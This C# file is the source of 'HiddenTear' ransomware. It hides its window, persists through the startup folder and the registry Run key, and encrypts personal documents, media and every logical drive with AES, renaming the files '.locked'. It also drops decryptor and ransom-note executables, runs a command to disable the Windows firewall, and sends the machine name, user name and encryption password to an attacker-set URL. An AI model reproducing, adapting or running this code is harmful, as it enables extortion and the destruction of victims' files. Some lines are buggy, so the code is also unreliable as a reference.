using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;




namespace HiddenTear
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            Common.Log("File opened!");
            InitializeComponent();
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            string password = createPassword(Settables.PASSLENGTH);
            Common.Log("password is : " + password);
                //string thisPath = Assembly.GetEntryAssembly().Location;
                //byte[] thisExe = File.ReadAllBytes(thisPath);
                //dropFile(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\HTCryptor.exe", thisExe);
                //addToStartupRegistry("Crypt", Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\HTCryptor.exe");

            Opacity = 0;
            this.ShowInTaskbar = false;
            startAction();
        }
        private void Form1_Shown(object sender, EventArgs e)
        {
            Visible = false;
            Opacity = 100;
        }

        static byte[] passwordBytes;
        static List<string> crypted = new List<string>();

        void startAction()
        {
            Common.Log("Sequence started!");
            string password = createPassword(Settables.PASSLENGTH);
            string thisPath = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
            byte[] thisExe = File.ReadAllBytes(thisPath);
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\HTCryptor.exe", thisExe);
            addToStartupRegistry("Crypt", Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\HTCryptor.exe");

            Common.Log("Persisted, starting encryption!");
            if (!string.IsNullOrEmpty(Settables.CONTAINMENTPATH))
            {
                encryptDirectory(Settables.CONTAINMENTPATH);
            }
            else
            {
                var sensitiveDirs = new[]
                {
                    Environment.GetFolderPath(Environment.SpecialFolder.Recent),
                    Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
                    Environment.GetFolderPath(Environment.SpecialFolder.MyMusic),
                    Environment.GetFolderPath(Environment.SpecialFolder.MyVideos),
                    Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
                    Environment.GetFolderPath(Environment.SpecialFolder.Favorites),
                    Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments),
                    Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures),
                    Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic),
                    Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos),
                    Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory)
                };
                foreach (string str in sensitiveDirs)
                {
                    encryptDirectory(str);
                }

                string[] drives = System.IO.Directory.GetLogicalDrives();
                foreach (string str in drives)
                {
                    encryptDirectory(str);
                }
            }


            dropFiles();
            if (Settables.URL != "") sendPassword(password);
            password = null;
            System.Windows.Forms.Application.Exit();
        }
        string createPassword(int length)
        {
            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
            StringBuilder res = new StringBuilder();
            Random rnd = new Random();
            while (0 < length--)
            {
                res.Append(valid[rnd.Next(valid.Length)]);
            }

            passwordBytes = Encoding.UTF8.GetBytes(res.ToString());
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
            return res.ToString();
        }
        void encryptDirectory(string location)
        {
            try
            {
                string[] files = Directory.GetFiles(location);
                string[] childDirectories = Directory.GetDirectories(location);
                for (int i = 0; i < files.Length; i++)
                {
                    string extension = Path.GetExtension(files[i]);
                    if (Settables.EXTENTIONS.Contains(extension.ToLower()))
                    {
                        encryptFile(files[i]);
                    }
                }
                for (int i = 0; i < childDirectories.Length; i++)
                {
                    encryptDirectory(childDirectories[i]);
                }
            }
            catch { }
        }
        void encryptFile(string file)
        {
            try
            {
                try
                {
                    if (Settables.Mode == ExecutionMode.Full)
                    {
                        byte[] bytesEncrypted = encryptAES(File.ReadAllBytes(file), passwordBytes);
                        File.WriteAllBytes(file, bytesEncrypted);
                        System.IO.File.Move(file, file + ".locked");
                        crypted.Add(file);
                    }
                    else if (new FileInfo(file).Length <= 4096)
                    {
                        byte[] bytesEncrypted = encryptAES(File.ReadAllBytes(file), passwordBytes);
                        File.WriteAllBytes(file, bytesEncrypted);
                        System.IO.File.Move(file, file + ".locked");
                        crypted.Add(file);
                    }
                    else
                    {
                        byte[] buff = new byte[8192];
                        using (BinaryReader reader = new BinaryReader(File.Open(file, FileMode.Open)))
                        {
                            byte[] bb = encryptAES(reader.ReadBytes(4096), passwordBytes);
                            Array.Copy(bb, buff, bb.Length);
                        }
                        using (BinaryWriter writer = new BinaryWriter(File.Open(file, FileMode.Open)))
                        {
                            writer.Write(buff);
                        }
                        System.IO.File.Move(file, file + ".locked");
                        crypted.Add(file);
                    }
                }
                catch (Exception ex)
                {
                    FileAttributes attributes = File.GetAttributes(file);
                    if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
                    {
                        attributes = RemoveAttribute(attributes, FileAttributes.ReadOnly);
                        File.SetAttributes(file, attributes);
                    }

                    if (Settables.Mode == ExecutionMode.Full)
                    {
                        byte[] bytesEncrypted = encryptAES(File.ReadAllBytes(file), passwordBytes);
                        File.WriteAllBytes(file, bytesEncrypted);
                        System.IO.File.Move(file, file + ".locked");
                        crypted.Add(file);
                    }
                    else if (new FileInfo(file).Length <= 4096)
                    {
                        byte[] bytesEncrypted = encryptAES(File.ReadAllBytes(file), passwordBytes);
                        File.WriteAllBytes(file, bytesEncrypted);
                        System.IO.File.Move(file, file + ".locked");
                        crypted.Add(file);
                    }
                    else
                    {
                        byte[] buff = new byte[8192];
                        using (BinaryReader reader = new BinaryReader(File.Open(file, FileMode.Open)))
                        {
                            buff = encryptAES(reader.ReadBytes(4096), passwordBytes);
                        }
                        using (BinaryWriter writer = new BinaryWriter(File.Open(file, FileMode.Open)))
                        {
                            writer.Write(buff);
                        }
                        System.IO.File.Move(file, file + ".locked");
                        crypted.Add(file);
                    }
                }
            }
            catch { }
        }
        byte[] encryptAES(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        {
            byte[] encryptedBytes = null;
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, Settables.SALT, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }

            return encryptedBytes;
        }

        void sendPassword(string password)
        {
            if (string.IsNullOrEmpty(Settables.URL)) return;
            string info = Environment.MachineName + "-" +
                            Environment.UserName + " " +
                            password;
            var fullUrl = Settables.URL + info;

            using (System.Net.WebClient client = new System.Net.WebClient())
            {
                string testie = "";
                try
                {
                    testie = client.DownloadString("google.com");
                }
                catch { }

                if (!string.IsNullOrEmpty(testie))
                {
                    try
                    {
                        var content = client.DownloadString(fullUrl);
                    }
                    catch { }
                }
                else
                {
                    try
                    {
                        System.Diagnostics.Process process = new System.Diagnostics.Process();
                        System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                        startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                        startInfo.FileName = "cmd.exe";
                        startInfo.Arguments = "netsh firewall set opmode disable";
                        process.StartInfo = startInfo;
                        process.Start();

                        process.WaitForExit();

                        var content = client.DownloadString(fullUrl);
                    }
                    catch { }
                }
            }
        }
        void dropFiles()
        {
            if (crypted.Count < 1) return;

            byte[] decryptorBuffer = getEmbeddedResource("HiddenTear.Embedded.HiddenTear-Decrypt.exe");
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\HTDecryptor.exe", decryptorBuffer);
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup) + @"\HTDecryptor.exe", decryptorBuffer);
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\HTDecryptor.exe", decryptorBuffer);
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory) + @"\HTDecryptor.exe", decryptorBuffer);
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory) + @"\HTDecryptor.exe", decryptorBuffer);
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.StartMenu) + @"\HTDecryptor.exe", decryptorBuffer);
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + @"\HTDecryptor.exe", decryptorBuffer);
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + @"\HTDecryptor.exe", decryptorBuffer);
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + @"\HTDecryptor.exe", decryptorBuffer);
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + @"\HTDecryptor.exe", decryptorBuffer);
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + @"\HTDecryptor.exe", decryptorBuffer);
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + @"\HTDecryptor.exe", decryptorBuffer);
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + @"\HTDecryptor.exe", decryptorBuffer);

            byte[] messageBuffer = getEmbeddedResource("HiddenTear.Embedded.HiddenTear-Message.exe");
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\message.exe", messageBuffer);
            dropFile(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup) + @"\message.exe", messageBuffer);

            addToStartupRegistry("Message", Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup) + @"\message.exe");
            startProcess(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup) + @"\message.exe");
        }


        static void dropFile(string path, byte[] buffer)
        {
            try 
            {
                if (!File.Exists(path))
                {
                    File.WriteAllBytes(path, buffer); 
                }
            }
            catch { }
        }
        static byte[] getEmbeddedResource(string fullName)
        {
            byte[] decryptorBuffer = default(byte[]);
            var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("fullName");
            using (var memstream = new MemoryStream())
            {
                stream.CopyTo(memstream);
                decryptorBuffer = memstream.ToArray();
            }
            return decryptorBuffer;
        }
        static void addToStartupRegistry(string name, string path)
        {
            try
            {
                RegistryKey add = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                add.SetValue(name, "\"" + path + "\"");
            }
            catch { }
        }
        static void startProcess(string path)
        {
            try
            {
                Process.Start(path);
            }
            catch { }
        }
        static FileAttributes RemoveAttribute(FileAttributes attributes, FileAttributes attributesToRemove)
        {
            return attributes & ~attributesToRemove;
        }
    }
}
